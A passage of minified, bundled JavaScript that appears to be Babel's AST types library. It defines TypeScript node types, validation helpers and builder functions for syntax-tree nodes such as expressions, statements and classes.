on:W1.validateType("Expression")}});p1("TSExportAssignment",{aliases:["Statement"],visitor:["expression"],fields:{expression:W1.validateType("Expression")}});p1("TSNamespaceExportDeclaration",{aliases:["Statement"],visitor:["id"],fields:{id:W1.validateType("Identifier")}});p1("TSTypeAnnotation",{visitor:["typeAnnotation"],fields:{typeAnnotation:{validate:W1.assertNodeType("TSType")}}});p1("TSTypeParameterInstantiation",{visitor:["params"],fields:{params:W1.validateArrayOfType("TSType")}});p1("TSTypeParameterDeclaration",{visitor:["params"],fields:{params:W1.validateArrayOfType("TSTypeParameter")}});p1("TSTypeParameter",{builder:["constraint","default","name"],visitor:["constraint","default"],fields:{name:{validate:W1.assertValueType("string")},in:{validate:W1.assertValueType("boolean"),optional:!0},out:{validate:W1.assertValueType("boolean"),optional:!0},const:{validate:W1.assertValueType("boolean"),optional:!0},constraint:{validate:W1.assertNodeType("TSType"),optional:!0},default:{validate:W1.assertNodeType("TSType"),optional:!0}}})});var sB=c((nB)=>{Object.defineProperty(nB,"__esModule",{value:!0});nB.DEPRECATED_ALIASES=void 0;var Id1=nB.DEPRECATED_ALIASES={ModuleDeclaration:"ImportOrExportDeclaration"}});var Y8=c((n9)=>{Object.defineProperty(n9,"__esModule",{value:!0});Object.defineProperty(n9,"ALIAS_KEYS",{enumerable:!0,get:function(){return c9.ALIAS_KEYS}});Object.defineProperty(n9,"BUILDER_KEYS",{enumerable:!0,get:function(){return c9.BUILDER_KEYS}});Object.defineProperty(n9,"DEPRECATED_ALIASES",{enumerable:!0,get:function(){return kW.DEPRECATED_ALIASES}});Object.defineProperty(n9,"DEPRECATED_KEYS",{enumerable:!0,get:function(){return c9.DEPRECATED_KEYS}});Object.defineProperty(n9,"FLIPPED_ALIAS_KEYS",{enumerable:!0,get:function(){return c9.FLIPPED_ALIAS_KEYS}});Object.defineProperty(n9,"NODE_FIELDS",{enumerable:!0,get:function(){return c9.NODE_FIELDS}});Object.defineProperty(n9,"NODE_PARENT_VALIDATIONS",{enumerable:!0,get:function(){return c9.NODE_PARENT_VALIDATIONS}});Object.defineProperty(n9,"PLACEHOLDERS",{enumerable:!0,get:function(){return bW.PLACEHOLDERS}});Object.defineProperty(n9,"PLACEHOLDERS_ALIAS",{enumerable:!0,get:function(){return bW.PLACEHOLDERS_ALIAS}});Object.defineProperty(n9,"PLACEHOLDERS_FLIPPED_ALIAS",{enumerable:!0,get:function(){return bW.PLACEHOLDERS_FLIPPED_ALIAS}});n9.TYPES=void 0;Object.defineProperty(n9,"VISITOR_KEYS",{enumerable:!0,get:function(){return c9.VISITOR_KEYS}});S5();vB();xB();hB();yB();rB();var c9=a8(),bW=EW(),kW=sB();Object.keys(kW.DEPRECATED_ALIASES).forEach((X)=>{c9.FLIPPED_ALIAS_KEYS[X]=c9.FLIPPED_ALIAS_KEYS[kW.DEPRECATED_ALIASES[X]]});for(let{types:X,set:J}of c9.allExpandedTypes)for(let Q of X){let Y=c9.FLIPPED_ALIAS_KEYS[Q];if(Y)Y.forEach(J.add,J);else J.add(Q)}var Pd1=n9.TYPES=[].concat(Object.keys(c9.VISITOR_KEYS),Object.keys(c9.FLIPPED_ALIAS_KEYS),Object.keys(c9.DEPRECATED_KEYS))});var R4=c((Xq)=>{Object.defineProperty(Xq,"__esModule",{value:!0});Xq.default=mp;Xq.validateChild=eB;Xq.validateField=tB;Xq.validateInternal=up;var T5=Y8();function mp(X,J,Q){if(!X)return;let Y=T5.NODE_FIELDS[X.type];if(!Y)return;let W=Y[J];tB(X,J,Q,W),eB(X,J,Q)}function up(X,J,Q,Y,W){if(!(X!=null&&X.validate))return;if(X.optional&&Y==null)return;if(X.validate(J,Q,Y),W){var z;let G=Y.type;if(G==null)return;(z=T5.NODE_PARENT_VALIDATIONS[G])==null||z.call(T5.NODE_PARENT_VALIDATIONS,J,Q,Y)}}function tB(X,J,Q,Y){if(!(Y!=null&&Y.validate))return;if(Y.optional&&Q==null)return;Y.validate(X,J,Q)}function eB(X,J,Q){var Y;let W=Q==null?void 0:Q.type;if(W==null)return;(Y=T5.NODE_PARENT_VALIDATIONS[W])==null||Y.call(T5.NODE_PARENT_VALIDATIONS,X,J,Q)}});var vW=c((Gq)=>{Object.defineProperty(Gq,"__esModule",{value:!0});Gq.anyTypeAnnotation=Ci;Gq.argumentPlaceholder=Xn;Gq.arrayExpression=ap;Gq.arrayPattern=pd;Gq.arrayTypeAnnotation=Pi;Gq.arrowFunctionExpression=dd;Gq.assignmentExpression=sp;Gq.assignmentPattern=ld;Gq.awaitExpression=Zi;Gq.bigIntLiteral=np;Gq.binaryExpression=op;Gq.bindExpression=Jn;Gq.blockStatement=Jd;Gq.booleanLiteral=Ld;Gq.booleanLiteralTypeAnnotation=Ti;Gq.booleanTypeAnnotation=Si;Gq.breakStatement=Qd;Gq.callExpression=Yd;Gq.catchClause=Wd;Gq.classAccessorProperty=Ai;Gq.classBody=id;Gq.classDeclaration=nd;Gq.classExpression=rd;Gq.classImplements=Ei;Gq.classMethod=zi;Gq.classPrivateMethod=Li;Gq.classPrivateProperty=Ni;Gq.classProperty=Ri;Gq.conditionalExpression=Gd;Gq.continueStatement=zd;Gq.debuggerStatement=Hd;Gq.decimalLiteral=Hn;Gq.declareClass=$i;Gq.declareExportAllDeclaration=mi;Gq.declareExportDeclaration=yi;Gq.declareFunction=ki;Gq.declareInterface=bi;Gq.declareModule=vi;Gq.declareModuleExports=xi;Gq.declareOpaqueType=gi;Gq.declareTypeAlias=fi;Gq.declareVariable=hi;Gq.declaredPredicate=ui;Gq.decorator=Qn;Gq.directive=ep;Gq.directiveLiteral=Xd;Gq.doExpression=Yn;Gq.doWhileStatement=Ud;Gq.emptyStatement=Kd;Gq.emptyTypeAnnotation=ti;Gq.enumBooleanBody=Pr;Gq.enumBooleanMember=Er;Gq.enumDeclaration=Cr;Gq.enumDefaultedMember=br;Gq.enumNumberBody=Sr;Gq.enumNumberMember=$r;Gq.enumStringBody=Tr;Gq.enumStringMember=kr;Gq.enumSymbolBody=_r;Gq.existsTypeAnnotation=ci;Gq.exportAllDeclaration=ad;Gq.exportDefaultDeclaration=sd;Gq.exportDefaultSpecifier=Wn;Gq.exportNamedDeclaration=od;Gq.exportNamespaceSpecifier=Fi;Gq.exportSpecifier=td;Gq.expressionStatement=Vd;Gq.file=Bd;Gq.forInStatement=qd;Gq.forOfStatement=ed;Gq.forStatement=Zd;Gq.functionDeclaration=Md;Gq.functionExpression=Fd;Gq.functionTypeAnnotation=li;Gq.functionTypeParam=pi;Gq.genericTypeAnnotation=di;Gq.identifier=jd;Gq.ifStatement=Od;Gq.import=Mi;Gq.importAttribute=Ii;Gq.importDeclaration=Xi;Gq.importDefaultSpecifier=Ji;Gq.importExpression=Wi;Gq.importNamespaceSpecifier=Qi;Gq.importSpecifier=Yi;Gq.indexedAccessType=vr;Gq.inferredPredicate=ii;Gq.interfaceDeclaration=ni;Gq.interfaceExtends=ri;Gq.interfaceTypeAnnotation=ai;Gq.interpreterDirective=tp;Gq.intersectionTypeAnnotation=si;Gq.jSXAttribute=Gq.jsxAttribute=fr;Gq.jSXClosingElement=Gq.jsxClosingElement=gr;Gq.jSXClosingFragment=Gq.jsxClosingFragment=sr;Gq.jSXElement=Gq.jsxElement=hr;Gq.jSXEmptyExpression=Gq.jsxEmptyExpression=yr;Gq.jSXExpressionContainer=Gq.jsxExpressionContainer=mr;Gq.jSXFragment=Gq.jsxFragment=nr;Gq.jSXIdentifier=Gq.jsxIdentifier=cr;Gq.jSXMemberExpression=Gq.jsxMemberExpression=lr;Gq.jSXNamespacedName=Gq.jsxNamespacedName=pr;Gq.jSXOpeningElement=Gq.jsxOpeningElement=dr;Gq.jSXOpeningFragment=Gq.jsxOpeningFragment=ar;Gq.jSXSpreadAttribute=Gq.jsxSpreadAttribute=ir;Gq.jSXSpreadChild=Gq.jsxSpreadChild=ur;Gq.jSXText=Gq.jsxText=rr;Gq.labeledStatement=Rd;Gq.logicalExpression=Dd;Gq.memberExpression=wd;Gq.metaProperty=Gi;Gq.mixedTypeAnnotation=oi;Gq.moduleExpression=Un;Gq.newExpression=Id;Gq.noop=or;Gq.nullLiteral=Nd;Gq.nullLiteralTypeAnnotation=_i;Gq.nullableTypeAnnotation=ei;Gq.numberLiteral=Ta;Gq.numberLiteralTypeAnnotation=Xr;Gq.numberTypeAnnotation=Jr;Gq.numericLiteral=Jq;Gq.objectExpression=Pd;Gq.objectMethod=Sd;Gq.objectPattern=Hi;Gq.objectProperty=Td;Gq.objectTypeAnnotation=Qr;Gq.objectTypeCallProperty=Wr;Gq.objectTypeIndexer=Gr;Gq.objectTypeInternalSlot=Yr;Gq.objectTypeProperty=zr;Gq.objectTypeSpreadProperty=Hr;Gq.opaqueType=Ur;Gq.optionalCallExpression=Oi;Gq.optionalIndexedAccessType=xr;Gq.optionalMemberExpression=ji;Gq.parenthesizedExpression=$d;Gq.pipelineBareFunction=Bn;Gq.pipelinePrimaryTopicReference=qn;Gq.pipelineTopicExpression=Vn;Gq.placeholder=tr;Gq.privateName=Di;Gq.program=Cd;Gq.qualifiedTypeIdentifier=Kr;Gq.recordExpression=Gn;Gq.regExpLiteral=Qq;Gq.regexLiteral=_a;Gq.restElement=Yq;Gq.restProperty=Ea;Gq.returnStatement=_d;Gq.sequenceExpression=Ed;Gq.spreadElement=Wq;Gq.spreadProperty=$a;Gq.staticBlock=wi;Gq.stringLiteral=Ad;Gq.stringLiteralTypeAnnotation=Vr;Gq.stringTypeAnnotation=Br;Gq.super=Ui;Gq.switchCase=kd;Gq.switchStatement=bd;Gq.symbolTypeAnnotation=qr;Gq.taggedTemplateExpression=Ki;Gq.templateElement=Vi;Gq.templateLiteral=Bi;Gq.thisExpression=vd;Gq.thisTypeAnnotation=Zr;Gq.throwStatement=xd;Gq.topicReference=Kn;Gq.tryStatement=fd;Gq.tSAnyKeyword=Gq.tsAnyKeyword=wn;Gq.tSArrayType=Gq.tsArrayType=ln;Gq.tSAsExpression=Gq.tsAsExpression=Va;Gq.tSBigIntKeyword=Gq.tsBigIntKeyword=Cn;Gq.tSBooleanKeyword=Gq.tsBooleanKeyword=In;Gq.tSCallSignatureDeclaration=Gq.tsCallSignatureDeclaration=Rn;Gq.tSConditionalType=Gq.tsConditionalType=on;Gq.tSConstructSignatureDeclaration=Gq.tsConstructSignatureDeclaration=An;Gq.tSConstructorType=Gq.tsConstructorType=hn;Gq.tSDeclareFunction=Gq.tsDeclareFunction=Fn;Gq.tSDeclareMethod=Gq.tsDeclareMethod=jn;Gq.tSEnumBody=Gq.tsEnumBody=Za;Gq.tSEnumDeclaration=Gq.tsEnumDeclaration=Ma;Gq.tSEnumMember=Gq.tsEnumMember=Fa;Gq.tSExportAssignment=Gq.tsExportAssignment=Da;Gq.tSExpressionWithTypeArguments=Gq.tsExpressionWithTypeArguments=Ga;Gq.tSExternalModuleReference=Gq.tsExternalModuleReference=Na;Gq.tSFunctionType=Gq.tsFunctionType=gn;Gq.tSImportEqualsDeclaration=Gq.tsImportEqualsDeclaration=Aa;Gq.tSImportType=Gq.tsImportType=Ra;Gq.tSIndexSignature=Gq.tsIndexSignature=Dn;Gq.tSIndexedAccessType=Gq.tsIndexedAccessType=Ja;Gq.tSInferType=Gq.tsInferType=tn;Gq.tSInstantiationExpression=Gq.tsInstantiationExpression=Ka;Gq.tSInterfaceBody=Gq.tsInterfaceBody=Ha;Gq.tSInterfaceDeclaration=Gq.tsInterfaceDeclaration=za;Gq.tSIntersectionType=Gq.tsIntersectionType=sn;Gq.tSIntrinsicKeyword=Gq.tsIntrinsicKeyword=Pn;Gq.tSLiteralType=Gq.tsLiteralType=Wa;Gq.tSMappedType=Gq.tsMappedType=Qa;Gq.tSMethodSignature=Gq.tsMethodSignature=Ln;Gq.tSModuleBlock=Gq.tsModuleBlock=Oa;Gq.tSModuleDeclaration=Gq.tsModuleDeclaration=ja;Gq.tSNamedTupleMember=Gq.tsNamedTupleMember=nn;Gq.tSNamespaceExportDeclaration=Gq.tsNamespaceExportDeclaration=wa;Gq.tSNeverKeyword=Gq.tsNeverKeyword=Sn;Gq.tSNonNullExpression=Gq.tsNonNullExpression=La;Gq.tSNullKeyword=Gq.tsNullKeyword=Tn;Gq.tSNumberKeyword=Gq.tsNumberKeyword=_n;Gq.tSObjectKeyword=Gq.tsObjectKeyword=En;Gq.tSOptionalType=Gq.tsOptionalType=dn;Gq.tSParameterProperty=Gq.tsParameterProperty=Mn;Gq.tSParenthesizedType=Gq.tsParenthesizedType=en;Gq.tSPropertySignature=Gq.tsPropertySignature=Nn;Gq.tSQualifiedName=Gq.tsQualifiedName=On;Gq.tSRestType=Gq.tsRestType=rn;Gq.tSSatisfiesExpression=Gq.tsSatisfiesExpression=Ba;Gq.tSStringKeyword=Gq.tsStringKeyword=$n;Gq.tSSymbolKeyword=Gq.tsSymbolKeyword=kn;Gq.tSTemplateLiteralType=Gq.tsTemplateLiteralType=Ya;Gq.tSThisType=Gq.tsThisType=fn;Gq.tSTupleType=Gq.tsTupleType=pn;Gq.tSTypeAliasDeclaration=Gq.tsTypeAliasDeclaration=Ua;Gq.tSTypeAnnotation=Gq.tsTypeAnnotation=Ia;Gq.tSTypeAssertion=Gq.tsTypeAssertion=qa;Gq.tSTypeLiteral=Gq.tsTypeLiteral=cn;Gq.tSTypeOperator=Gq.tsTypeOperator=Xa;Gq.tSTypeParameter=Gq.tsTypeParameter=Sa;Gq.tSTypeParameterDeclaration=Gq.tsTypeParameterDeclaration=Pa;Gq.tSTypeParameterInstantiation=Gq.tsTypeParameterInstantiation=Ca;Gq.tSTypePredicate=Gq.tsTypePredicate=mn;Gq.tSTypeQuery=Gq.tsTypeQuery=un;Gq.tSTypeReference=Gq.tsTypeReference=yn;Gq.tSUndefinedKeyword=Gq.tsUndefinedKeyword=bn;Gq.tSUnionType=Gq.tsUnionType=an;Gq.tSUnknownKeyword=Gq.tsUnknownKeyword=vn;Gq.tSVoidKeyword=Gq.tsVoidKeyword=xn;Gq.tupleExpression=zn;Gq.tupleTypeAnnotation=Mr;Gq.typeAlias=jr;Gq.typeAnnotation=Or;Gq.typeCastExpression=Rr;Gq.typeParameter=Ar;Gq.typeParameterDeclaration=Nr;Gq.typeParameterInstantiation=Lr;Gq.typeofTypeAnnotation=Fr;Gq.unaryExpression=gd;Gq.unionTypeAnnotation=Dr;Gq.updateExpression=hd;Gq.v8IntrinsicIdentifier=er;Gq.variableDeclaration=yd;Gq.variableDeclarator=md;Gq.variance=wr;Gq.voidPattern=Zn;Gq.voidTypeAnnotation=Ir;Gq.whileStatement=ud;Gq.withStatement=cd;Gq.yieldExpression=qi;var ip=R4(),D4=uJ(),rp=a8(),{validateInternal:R}=ip,{NODE_FIELDS:x}=rp;function np(X){if(typeof X==="bigint")X=X.toString();let J={type:"BigIntLiteral",value:X},Q=x.BigIntLiteral;return R(Q.value,J,"value",X),J}function ap(X=[]){let J={type:"ArrayExpression",elements:X},Q=x.ArrayExpression;return R(Q.elements,J,"elements",X,1),J}function sp(X,J,Q){let Y={type:"AssignmentExpression",operator:X,left:J,right:Q},W=x.AssignmentExpression;return R(W.operator,Y,"operator",X),R(W.left,Y,"left",J,1),R(W.right,Y,"right",Q,1),Y}function op(X,J,Q){let Y={type:"BinaryExpression",operator:X,left:J,right:Q},W=x.BinaryExpression;return R(W.operator,Y,"operator",X),R(W.left,Y,"left",J,1),R(W.right,Y,"right",Q,1),Y}function tp(X){let J={type:"InterpreterDirective",value:X},Q=x.InterpreterDirective;return R(Q.value,J,"value",X),J}function ep(X){let J={type:"Directive",value:X},Q=x.Directive;return R(Q.value,J,"value",X,1),J}function Xd(X){let J={type:"DirectiveLiteral",value:X},Q=x.DirectiveLiteral;return R(Q.value,J,"value",X),J}function Jd(X,J=[]){let Q={type:"BlockStatement",body:X,directives:J},Y=x.BlockStatement;return R(Y.body,Q,"body",X,1),R(Y.directives,Q,"directives",J,1),Q}function Qd(X=null){let J={type:"BreakStatement",label:X},Q=x.BreakStatement;return R(Q.label,J,"label",X,1),J}function Yd(X,J){let Q={type:"CallExpression",callee:X,arguments:J},Y=x.CallExpression;return R(Y.callee,Q,"callee",X,1),R(Y.arguments,Q,"arguments",J,1),Q}function Wd(X=null,J){let Q={type:"CatchClause",param:X,body:J},Y=x.CatchClause;return R(Y.param,Q,"param",X,1),R(Y.body,Q,"body",J,1),Q}function Gd(X,J,Q){let Y={type:"ConditionalExpression",test:X,consequent:J,alternate:Q},W=x.ConditionalExpression;return R(W.test,Y,"test",X,1),R(W.consequent,Y,"consequent",J,1),R(W.alternate,Y,"alternate",Q,1),Y}function zd(X=null){let J={type:"ContinueStatement",label:X},Q=x.ContinueStatement;return R(Q.label,J,"label",X,1),J}function Hd(){return{type:"DebuggerStatement"}}function Ud(X,J){let Q={type:"DoWhileStatement",test:X,body:J},Y=x.DoWhileStatement;return R(Y.test,Q,"test",X,1),R(Y.body,Q,"body",J,1),Q}function Kd(){return{type:"EmptyStatement"}}function Vd(X){let J={type:"ExpressionStatement",expression:X},Q=x.ExpressionStatement;return R(Q.expression,J,"expression",X,1),J}function Bd(X,J=null,Q=null){let Y={type:"File",program:X,comments:J,tokens:Q},W=x.File;return R(W.program,Y,"program",X,1),R(W.comments,Y,"comments",J,1),R(W.tokens,Y,"tokens",Q),Y}function qd(X,J,Q){let Y={type:"ForInStatement",left:X,right:J,body:Q},W=x.ForInStatement;return R(W.left,Y,"left",X,1),R(W.right,Y,"right",J,1),R(W.body,Y,"body",Q,1),Y}function Zd(X=null,J=null,Q=null,Y){let W={type:"ForStatement",init:X,test:J,update:Q,body:Y},z=x.ForStatement;return R(z.init,W,"init",X,1),R(z.test,W,"test",J,1),R(z.update,W,"update",Q,1),R(z.body,W,"body",Y,1),W}function Md(X=null,J,Q,Y=!1,W=!1){let z={type:"FunctionDeclaration",id:X,params:J,body:Q,generator:Y,async:W},G=x.FunctionDeclaration;return R(G.id,z,"id",X,1),R(G.params,z,"params",J,1),R(G.body,z,"body",Q,1),R(G.generator,z,"generator",Y),R(G.async,z,"async",W),z}function Fd(X=null,J,Q,Y=!1,W=!1){let z={type:"FunctionExpression",id:X,params:J,body:Q,generator:Y,async:W},G=x.FunctionExpression;return R(G.id,z,"id",X,1),R(G.params,z,"params",J,1),R(G.body,z,"body",Q,1),R(G.generator,z,"generator",Y),R(G.async,z,"async",W),z}function jd(X){let J={type:"Identifier",name:X},Q=x.Identifier;return R(Q.name,J,"name",X),J}function Od(X,J,Q=null){let Y={type:"IfStatement",test:X,consequent:J,alternate:Q},W=x.IfStatement;return R(W.test,Y,"test",X,1),R(W.consequent,Y,"consequent",J,1),R(W.alternate,Y,"alternate",Q,1),Y}function Rd(X,J){let Q={type:"LabeledStatement",label:X,body:J},Y=x.LabeledStatement;return R(Y.label,Q,"label",X,1),R(Y.body,Q,"body",J,1),Q}function Ad(X){let J={type:"StringLiteral",value:X},Q=x.StringLiteral;return R(Q.value,J,"value",X),J}function Jq(X){let J={type:"NumericLiteral",value:X},Q=x.NumericLiteral;return R(Q.value,J,"value",X),J}function Nd(){return{type:"NullLiteral"}}function Ld(X){let J={type:"BooleanLiteral",value:X},Q=x.BooleanLiteral;return R(Q.value,J,"value",X),J}function Qq(X,J=""){let Q={type:"RegExpLiteral",pattern:X,flags:J},Y=x.RegExpLiteral;return R(Y.pattern,Q,"pattern",X),R(Y.flags,Q,"flags",J),Q}function Dd(X,J,Q){let Y={type:"LogicalExpression",operator:X,left:J,right:Q},W=x.LogicalExpression;return R(W.operator,Y,"operator",X),R(W.left,Y,"left",J,1),R(W.right,Y,"right",Q,1),Y}function wd(X,J,Q=!1,Y=null){let W={type:"MemberExpression",object:X,property:J,computed:Q,optional:Y},z=x.MemberExpression;return R(z.object,W,"object",X,1),R(z.property,W,"property",J,1),R(z.computed,W,"computed",Q),R(z.optional,W,"optional",Y),W}function Id(X,J){let Q={type:"NewExpression",callee:X,arguments:J},Y=x.NewExpression;return R(Y.callee,Q,"callee",X,1),R(Y.arguments,Q,"arguments",J,1),Q}function Cd(X,J=[],Q="script",Y=null){let W={type:"Program",body:X,directives:J,sourceType:Q,interpreter:Y},z=x.Program;return R(z.body,W,"body",X,1),R(z.directives,W,"directives",J,1),R(z.sourceType,W,"sourceType",Q),R(z.interpreter,W,"interpreter",Y,1),W}function Pd(X){let J={type:"ObjectExpression",properties:X},Q=x.ObjectExpression;return R(Q.properties,J,"properties",X,1),J}function Sd(X="method",J,Q,Y,W=!1,z=!1,G=!1){let H={type:"ObjectMethod",kind:X,key:J,params:Q,body:Y,computed:W,generator:z,async:G},U=x.ObjectMethod;return R(U.kind,H,"kind",X),R(U.key,H,"key",J,1),R(U.params,H,"params",Q,1),R(U.body,H,"body",Y,1),R(U.computed,H,"computed",W),R(U.generator,H,"generator",z),R(U.async,H,"async",G),H}function Td(X,J,Q=!1,Y=!1,W=null){let z={type:"ObjectProperty",key:X,value:J,computed:Q,shorthand:Y,decorators:W},G=x.ObjectProperty;return R(G.key,z,"key",X,1),R(G.value,z,"value",J,1),R(G.computed,z,"computed",Q),R(G.shorthand,z,"shorthand",Y),R(G.decorators,z,"decorators",W,1),z}function Yq(X){let J={type:"RestElement",argument:X},Q=x.RestElement;return R(Q.argument,J,"argument",X,1),J}function _d(X=null){let J={type:"ReturnStatement",argument:X},Q=x.ReturnStatement;return R(Q.argument,J,"argument",X,1),J}function Ed(X){let J={type:"SequenceExpression",expressions:X},Q=x.SequenceExpression;return R(Q.expressions,J,"expressions",X,1),J}function $d(X){let J={type:"ParenthesizedExpression",expression:X},Q=x.ParenthesizedExpression;return R(Q.expression,J,"expression",X,1),J}function kd(X=null,J){let Q={type:"SwitchCase",test:X,consequent:J},Y=x.SwitchCase;return R(Y.test,Q,"test",X,1),R(Y.consequent,Q,"consequent",J,1),Q}function bd(X,J){let Q={type:"SwitchStatement",discriminant:X,cases:J},Y=x.SwitchStatement;return R(Y.discriminant,Q,"discriminant",X,1),R(Y.cases,Q,"cases",J,1),Q}function vd(){return{type:"ThisExpression"}}function xd(X){let J={type:"ThrowStatement",argument:X},Q=x.ThrowStatement;return R(Q.argument,J,"argument",X,1),J}function fd(X,J=null,Q=null){let Y={type:"TryStatement",block:X,handler:J,finalizer:Q},W=x.TryStatement;return R(W.block,Y,"block",X,1),R(W.handler,Y,"handler",J,1),R(W.finalizer,Y,"finalizer",Q,1),Y}function gd(X,J,Q=!0){let Y={type:"UnaryExpression",operator:X,argument:J,prefix:Q},W=x.UnaryExpression;return R(W.operator,Y,"operator",X),R(W.argument,Y,"argument",J,1),R(W.prefix,Y,"prefix",Q),Y}function hd(X,J,Q=!1){let Y={type:"UpdateExpression",operator:X,argument:J,prefix:Q},W=x.UpdateExpression;return R(W.operator,Y,"operator",X),R(W.argument,Y,"argument",J,1),R(W.prefix,Y,"prefix",Q),Y}function yd(X,J){let Q={type:"VariableDeclaration",kind:X,declarations:J},Y=x.VariableDeclaration;return R(Y.kind,Q,"kind",X),R(Y.declarations,Q,"declarations",J,1),Q}function md(X,J=null){let Q={type:"VariableDeclarator",id:X,init:J},Y=x.VariableDeclarator;return R(Y.id,Q,"id",X,1),R(Y.init,Q,"init",J,1),Q}function ud(X,J){let Q={type:"WhileStatement",test:X,body:J},Y=x.WhileStatement;return R(Y.test,Q,"test",X,1),R(Y.body,Q,"body",J,1),Q}function cd(X,J){let Q={type:"WithStatement",object:X,body:J},Y=x.WithStatement;return R(Y.object,Q,"object",X,1),R(Y.body,Q,"body",J,1),Q}function ld(X,J){let Q={type:"AssignmentPattern",left:X,right:J},Y=x.AssignmentPattern;return R(Y.left,Q,"left",X,1),R(Y.right,Q,"right",J,1),Q}function pd(X){let J={type:"ArrayPattern",elements:X},Q=x.ArrayPattern;return R(Q.elements,J,"elements",X,1),J}function dd(X,J,Q=!1){let Y={type:"ArrowFunctionExpression",params:X,body:J,async:Q,expression:null},W=x.ArrowFunctionExpression;return R(W.params,Y,"params",X,1),R(W.body,Y,"body",J,1),R(W.async,Y,"async",Q),Y}function id(X){let J={type:"ClassBody",body:X},Q=x.ClassBody;return R(Q.body,J,"body",X,1),J}function rd(X=null,J=null,Q,Y=null){let W={type:"ClassExpression",id:X,superClass:J,body:Q,decorators:Y},z=x.ClassExpression;return R(z.id,W,"id",X,1),R(z.superClass,W,"superClass",J,1),R(z.body,W,"body",Q,1),R(z.decorators,W,"decorators",Y,1),W}function nd(X=null,J=null,Q,Y=null){let W={type:"ClassDeclaration",id:X,superClass:J,body:Q,decorators:Y},z=x.ClassDeclaration;return R(z.id,W,"id",X,1),R(z.superClass,W,"superClass",J,1),R(z.body,W,"body",Q,1),R(z.decorators,W,"decorators",Y,1),W}function ad(X){let J={type:"ExportAllDeclaration",source:X},Q=x.ExportAllDeclaration;return R(Q.source,J,"source",X,1),J}function sd(X){let J={type:"ExportDefaultDeclaration",declaration:X},Q=x.ExportDefaultDeclaration;return R(Q.declaration,J,"declaration",X,1),J}function od(X=null,J=[],Q=null){let Y={type:"ExportNamedDeclaration",declaration:X,specifiers:J,source:Q},W=x.ExportNamedDeclaration;return R(W.declaration,Y,"declaration",X,1),R(W.specifiers,Y,"specifiers",J,1),R(W.source,Y,"source",Q,1),Y}function td(X,J){let Q={type:"ExportSpecifier",local:X,exported:J},Y=x.ExportSpecifier;return R(Y.local,Q,"local",X,1),R(Y.exported,Q,"exported",J,1),Q}function ed(X,J,Q,Y=!1){let W={type:"ForOfStatement",left:X,right:J,body:Q,await:Y},z=x.ForOfStatement;return R(z.left,W,"left",X,1),R(z.right,W,"right",J,1),R(z.body,W,"body",Q,1),R(z.await,W,"await",Y),W}function Xi(X,J){let Q={type:"ImportDeclaration",specifiers:X,source:J},Y=x.ImportDeclaration;return R(Y.specifiers,Q,"specifiers",X,1),R(Y.source,Q,"source",J,1),Q}function Ji(X){let J={type:"ImportDefaultSpecifier",local:X},Q=x.ImportDefaultSpecifier;return R(Q.local,J,"local",X,1),J}function Qi(X){let J={type:"ImportNamespaceSpecifier",local:X},Q=x.ImportNamespaceSpecifier;return R(Q.local,J,"local",X,1),J}function Yi(X,J){let Q={type:"ImportSpecifier",local:X,imported:J},Y=x.ImportSpecifier;return R(Y.local,Q,"local",X,1),R(Y.imported,Q,"imported",J,1),Q}function Wi(X,J=null){let Q={type:"ImportExpression",source:X,options:J},Y=x.ImportExpression;return R(Y.source,Q,"source",X,1),R(Y.options,Q,"options",J,1),Q}function Gi(X,J){let Q={type:"MetaProperty",meta:X,property:J},Y=x.MetaProperty;return R(Y.meta,Q,"meta",X,1),R(Y.property,Q,"property",J,1),Q}function zi(X="method",J,Q,Y,W=!1,z=!1,G=!1,H=!1){let U={type:"ClassMethod",kind:X,key:J,params:Q,body:Y,computed:W,static:z,generator:G,async:H},K=x.ClassMethod;return R(K.kind,U,"kind",X),R(K.key,U,"key",J,1),R(K.params,U,"params",Q,1),R(K.body,U,"body",Y,1),R(K.computed,U,"computed",W),R(K.static,U,"static",z),R(K.generator,U,"generator",G),R(K.async,U,"async",H),U}function Hi(X){let J={type:"ObjectPattern",properties:X},Q=x.ObjectPattern;return R(Q.properties,J,"properties",X,1),J}function Wq(X){let J={type:"SpreadElement",argument:X},Q=x.SpreadElement;return R(Q.argument,J,"argument",X,1),J}function Ui(){return{type:"Super"}}function Ki(X,J){let Q={type:"TaggedTemplateExpression",tag:X,quasi:J},Y=x.TaggedTemplateExpression;return R(Y.tag,Q,"tag",X,1),R(Y.quasi,Q,"quasi",J,1),Q}function Vi(X,J=!1){let Q={type:"TemplateElement",value:X,tail:J},Y=x.TemplateElement;return R(Y.value,Q,"value",X),R(Y.tail,Q,"tail",J),Q}function Bi(X,J){let Q={type:"TemplateLiteral",quasis:X,expressions:J},Y=x.TemplateLiteral;return R(Y.quasis,Q,"quasis",X,1),R(Y.expressions,Q,"expressions",J,1),Q}function qi(X=null,J=!1){let Q={type:"YieldExpression",argument:X,delegate:J},Y=x.YieldExpression;return R(Y.argument,Q,"argument",X,1),R(Y.delegate,Q,"delegate",J),Q}function Zi(X){let J={type:"AwaitExpression",argument:X},Q=x.AwaitExpression;return R(Q.argument,J,"argument",X,1),J}function Mi(){return{type:"Import"}}function Fi(X){let J={type:"ExportNamespaceSpecifier",exported:X},Q=x.ExportNamespaceSpecifier;return R(Q.exported,J,"exported",X,1),J}function ji(X,J,Q=!1,Y){let W={type:"OptionalMemberExpression",object:X,property:J,computed:Q,optional:Y},z=x.OptionalMemberExpression;return R(z.object,W,"object",X,1),R(z.property,W,"property",J,1),R(z.computed,W,"computed",Q),R(z.optional,W,"optional",Y),W}function Oi(X,J,Q){let Y={type:"OptionalCallExpression",callee:X,arguments:J,optional:Q},W=x.OptionalCallExpression;return R(W.callee,Y,"callee",X,1),R(W.arguments,Y,"arguments",J,1),R(W.optional,Y,"optional",Q),Y}function Ri(X,J=null,Q=null,Y=null,W=!1,z=!1){let G={type:"ClassProperty",key:X,value:J,typeAnnotation:Q,decorators:Y,computed:W,static:z},H=x.ClassProperty;return R(H.key,G,"key",X,1),R(H.value,G,"value",J,1),R(H.typeAnnotation,G,"typeAnnotation",Q,1),R(H.decorators,G,"decorators",Y,1),R(H.computed,G,"computed",W),R(H.static,G,"static",z),G}function Ai(X,J=null,Q=null,Y=null,W=!1,z=!1){let G={type:"ClassAccessorProperty",key:X,value:J,typeAnnotation:Q,decorators:Y,computed:W,static:z},H=x.ClassAccessorProperty;return R(H.key,G,"key",X,1),R(H.value,G,"value",J,1),R(H.typeAnnotation,G,"typeAnnotation",Q,1),R(H.decorators,G,"decorators",Y,1),R(H.computed,G,"computed",W),R(H.static,G,"static",z),G}function Ni(X,J=null,Q=null,Y=!1){let 